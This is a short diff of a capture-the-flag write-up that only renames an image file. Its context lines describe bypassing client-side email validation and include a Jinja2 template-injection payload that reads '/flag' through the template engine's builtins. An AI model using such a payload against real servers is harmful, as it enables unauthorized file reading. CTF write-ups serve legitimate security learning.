@@ -104,7 +104,7 @@ Email verification is done only on client-side.
 
 Remove the attribute `type="email"`, and input `{{ request['application']['__globals__']['__builtins__']['open']('/flag').read() }}`.
 
-![SQL: `CTF{tH3s3_n1Nj4s_aR3_h3cK1nG_mY_jInjA_t3MpLatEs!!one!}`](images/my-first-php-2.png)
+![SQL: `CTF{tH3s3_n1Nj4s_aR3_h3cK1nG_mY_jInjA_t3MpLatEs!!one!}`](images/web-ninja.png)
 
 ## No SQL Injection 1 (15 points)
 > I have heard all about the issues that SQL injection attacks can cause.
